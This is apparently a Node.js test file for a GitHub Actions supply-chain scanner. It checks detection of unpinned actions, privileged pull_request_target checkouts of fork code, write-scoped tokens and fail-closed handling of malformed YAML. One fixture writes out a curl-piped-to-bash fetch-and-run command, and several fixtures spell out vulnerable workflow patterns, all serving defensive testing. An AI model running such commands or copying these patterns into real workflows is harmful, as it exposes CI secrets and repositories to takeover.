'use strict';
const test=require('node:test'),assert=require('node:assert/strict'),fs=require('node:fs'),path=require('node:path');
const {reviewWorkflows}=require('./ultra_sentinel_supply_chain.cjs');
const SHA='a'.repeat(40),F='.github/workflows/ci.yml';
const scan=src=>reviewWorkflows({sha:SHA,expected:[F],sources:{[F]:src}});
const rules=s=>s.findings.map(f=>f.rule);
test('trusted SHA-pinned read-only workflow has no supply-chain alerts',()=>{
 const r=scan("on: pull_request\npermissions:\n  contents: read\njobs:\n  test:\n    steps:\n      - uses: actions/checkout@"+'a'.repeat(40)+"\n");
 assert.equal(r.status,'NO_RISK_PATTERN');assert.equal(r.findings.length,0);assert.equal(r.coverage.partial,false);
});
test('unpinned external Actions are detected even if their comment claims v6',()=>{
 const r=scan('jobs:\n  x:\n    steps:\n      - uses: actions/checkout@v6 # SHA pinned\n');
 assert.ok(rules(r).includes('UNPINNED_ACTION'));assert.equal(r.findings[0].severity,'HIGH');
});
test('supply-chain source scanning catches untrusted checkout on existing privileged trigger',()=>{
 const r=scan("on:\n  pull_request_target:\n    types: [opened]\njobs:\n  scan:\n    steps:\n      - uses: actions/checkout@"+'a'.repeat(40)+
 "\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n");
 assert.ok(rules(r).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
 assert.equal(r.findings.find(x=>x.rule==='PRIVILEGED_PR_CODE_CHECKOUT').severity,'BLOCKER');
});
test('write-capable workflow triggers a human review finding, not a claim of exploitation',()=>{
 const r=scan('on: pull_request_target\npermissions:\n  contents: write\n  pull-requests: write\n');
 assert.ok(rules(r).includes('PRIVILEGED_WRITE_TOKEN'));assert.equal(r.status,'REVIEW_REQUIRED');
});
test('remote shell download pipeline is treated as risky, not executed',()=>{
 const r=scan('jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://x.invalid/script.sh | bash\n');
 assert.ok(rules(r).includes('REMOTE_SHELL_PIPELINE'));
});
test('missing requested workflow content cannot produce a clean report',()=>{
 const r=reviewWorkflows({sha:SHA,expected:[F],sources:{}});
 assert.equal(r.status,'INCOMPLETE');assert.equal(r.coverage.partial,true);
});
test('oversized workflow is rejected without analyzing a truncated fragment',()=>{
 const r=scan('x'.repeat(180000));
 assert.equal(r.status,'INCOMPLETE');assert.equal(r.coverage.partial,true);
});
test('unrelated code changes do not create fictitious evidence',()=>{
 const r=reviewWorkflows({sha:SHA,expected:[],sources:{}});
 assert.equal(r.status,'NOT_APPLICABLE');
});
test('invalid or traversal paths fail closed and no secrets leak into output',()=>{
 const r=reviewWorkflows({sha:SHA,expected:['.github/workflows/../private.yml'],sources:{}});
 assert.equal(r.status,'INCOMPLETE');
 const marker='SECRET_VALUE_DO_NOT_LEAK_666';
 const found=scan("jobs:\n  x:\n    steps:\n      - uses: evil/repo@v1 # "+marker+"\n");
 assert.ok(found.findings.length);assert.doesNotMatch(JSON.stringify(found),new RegExp(marker));
});
test('workflow integration takes exact immutable SHA, never exposes PR source to shell',()=>{
 const y=fs.readFileSync(path.resolve(__dirname,'../workflows/ultra-sentinel-auto-review.yml'),'utf8');
 assert.match(y,/ultra_sentinel_supply_chain\.cjs/);
 assert.match(y,/reviewWorkflows/);
 assert.match(y,/const supplyChain=reviewWorkflows/);
 assert.match(y,/ref:pr.head.sha/);
 assert.doesNotMatch(y,/contents: write|issues: write|pull-requests: write/);
});

test('invalid immutable SHA marks evidence explicitly partial (fail-closed)',()=>{
 const r=reviewWorkflows({sha:'invalid',expected:[F],sources:{[F]:'permissions:\n  contents: read\n'}});
 assert.equal(r.status,'INCOMPLETE');
 assert.equal(r.coverage.partial,true);
 assert.equal(r.autoApproveAllowed,false);
});

test('P1: quoted YAML flow ref aliases on privileged checkout fail closed',()=>{
 for(const key of ['"ref"',"'ref'",'ref']){
  const workflow='on: pull_request_target\njobs:\n  scan:\n    steps:\n      - {uses: actions/checkout@'+SHA+', with: {'+key+': *danger}}\n';
  const result=scan(workflow);
  assert.equal(result.status,'INCOMPLETE','ref key '+key);
  assert.equal(result.coverage.partial,true,'ref key '+key);
 }
});

test('Codex P1: bare dash YAML step detects unsafe checkout and missing action SHA',()=>{
 const workflow=[
  'on: pull_request_target','jobs:','  gate:','    steps:',
  '      -','        uses: actions/checkout@v6',
  '        with:','          ref: \${{ github.head_ref }}'
 ].join('\n')+'\n';
 const result=scan(workflow);
 assert.ok(rules(result).includes('UNPINNED_ACTION'));
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
 assert.equal(result.status,'REVIEW_REQUIRED');
});
test('bare dash step with SHA pinned checkout and trusted ref is benign',()=>{
 const workflow=['on: pull_request_target','jobs:','  gate:','    steps:',
  '      -','        uses: actions/checkout@'+SHA,
  '        with:','          ref: main'].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'NO_RISK_PATTERN');
});
test('Codex P2: multiline flow permissions detect first writable key on shared line',()=>{
 const workflow=['on: pull_request','permissions: {',
  '  contents: write, issues: read','}',
  'jobs:','  check:','    steps:','      - uses: actions/checkout@'+SHA].join('\n');
 const result=scan(workflow);
 assert.ok(rules(result).includes('PRIVILEGED_WRITE_TOKEN'));
 assert.equal(result.status,'REVIEW_REQUIRED');
});
test('multiline flow read-only permissions and env maps do not produce false write findings',()=>{
 const workflow=['on: pull_request','permissions: {','  contents: read, issues: read','}',
  'jobs:','  check:','    env:','      contents: write, issues: read',
  '    steps:','      - uses: actions/checkout@'+SHA].join('\n');
 const result=scan(workflow);
 assert.ok(!rules(result).includes('PRIVILEGED_WRITE_TOKEN'));
});

test('Codex P1: bare dash child mapping supports nonstandard valid indentation',()=>{
 const workflow=['on: pull_request_target','jobs:','  scan:','    steps:',
 '      -','          uses: actions/checkout@v6','          with:',
 '              ref: '+('$'+'{{ github.head_ref }}')].join('\n');
 const result=scan(workflow);
 assert.ok(rules(result).includes('UNPINNED_ACTION'));
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('bare dash child mapping with extra indentation stays safe for trusted checkout',()=>{
 const workflow=['on: pull_request_target','jobs:','  scan:','    steps:',
 '      -','          uses: actions/checkout@'+SHA,'          with:',
 '              ref: main'].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'NO_RISK_PATTERN');
});
test('Codex P1: flow steps ignore closing braces in YAML comments',()=>{
 const workflow=['on: pull_request_target','jobs:','  scan:','    steps:',
 '      - { # } is a comment, not a closing map',
 '          uses: actions/checkout@v6,',
 '          with: {ref: "'+('$'+'{{ github.head_ref }}')+'"}',
 '        }'].join('\n');
 const result=scan(workflow);
 assert.ok(rules(result).includes('UNPINNED_ACTION'));
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('flow steps with incomplete maps fail closed, never appear clean',()=>{
 const workflow=['on: pull_request_target','jobs:','  scan:','    steps:',
 '      - { # } fake close in comment','        uses: actions/checkout@'+SHA].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'INCOMPLETE');
 assert.equal(result.coverage.partial,true);
});
test('Codex P2: flow permissions ignore comment braces before write scopes',()=>{
 const workflow=['on: pull_request','permissions: { # } not the closing brace',
 '  contents: write, issues: read','}', 'jobs:','  scan:','    steps:',
 '      - uses: actions/checkout@'+SHA].join('\n');
 const result=scan(workflow);
 assert.ok(rules(result).includes('PRIVILEGED_WRITE_TOKEN'));
});
test('commented braces in read-only permission flow do not invent writable scopes',()=>{
 const workflow=['on: pull_request','permissions: { # } fake close',
 '  contents: read, issues: read','}', 'jobs:','  scan:','    steps:','      - uses: actions/checkout@'+SHA].join('\n');
 const result=scan(workflow);
 assert.equal(result.status,'NO_RISK_PATTERN');
});

test('Codex P1: privileged flow-sequence trigger ignores commented closing bracket',()=>{
 const src=['on: [ # ] commented bracket','  push,','  pull_request_target',']',
 'jobs:','  audit:','    steps:','      - uses: actions/checkout@'+SHA,
 '        with:','          ref: '+('$'+'{{ github.head_ref }}')].join('\n');
 const result=scan(src);
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('Codex P1: privileged flow-map trigger ignores commented closing brace',()=>{
 const src=['on: { # } commented brace','  pull_request_target: null','}',
 'jobs:','  audit:','    steps:','      - uses: actions/checkout@'+SHA,
 '        with:','          ref: '+('$'+'{{ github.head_ref }}')].join('\n');
 const result=scan(src);
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('flow trigger with only push stays unprivileged despite commented event text',()=>{
 const src=['on: [ # pull_request_target','  push',']',
 'jobs:','  audit:','    steps:','      - uses: actions/checkout@'+SHA,
 '        with:','          ref: '+('$'+'{{ github.head_ref }}')].join('\n');
 const result=scan(src);
 assert.ok(!rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('Codex P1: workflow_run checkout of triggering run head SHA is untrusted',()=>{
 const src=['on: workflow_run','jobs:','  audit:','    steps:',
 '      - uses: actions/checkout@'+SHA,
 '        with:','          ref: '+('$'+'{{ github.event.workflow_run.head_sha }}')].join('\n');
 const result=scan(src);
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('Codex P1: privileged checkout from PR fork repository is untrusted even at main',()=>{
 const src=['on: pull_request_target','jobs:','  audit:','    steps:',
 '      - uses: actions/checkout@'+SHA,
 '        with:','          repository: '+('$'+'{{ github.event.pull_request.head.repo.full_name }}'),
 '          ref: main'].join('\n');
 const result=scan(src);
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('privileged checkout in YAML flow step detects fork repository expressions',()=>{
 const src=['on: pull_request_target','jobs:','  audit:','    steps:',
 '      - {uses: actions/checkout@'+SHA+', with: {repository: "'+('$'+'{{ github.event.pull_request.head.repo.full_name }}')+'", ref: main}}'].join('\n');
 const result=scan(src);
 assert.ok(rules(result).includes('PRIVILEGED_PR_CODE_CHECKOUT'));
});
test('Codex P2: quoted flow message mentioning ref alias must stay benign',()=>{
 const src=['on: pull_request','jobs:','  audit:','    steps:',
 '      - {uses: owner/action@'+SHA+', with: {message: ", ref: *not-an-alias"}}'].join('\n');
 const result=scan(src);
 assert.equal(result.status,'NO_RISK_PATTERN');
 assert.equal(result.coverage.partial,false);
});
test('quoted flow message does not suppress a real sensitive alias',()=>{
 const src=['on: pull_request_target','jobs:','  audit:','    steps:',
 '      - {uses: actions/checkout@'+SHA+', with: {message: ", ref: *fake", ref: *danger}}'].join('\n');
 const result=scan(src);
 assert.equal(result.status,'INCOMPLETE');
});
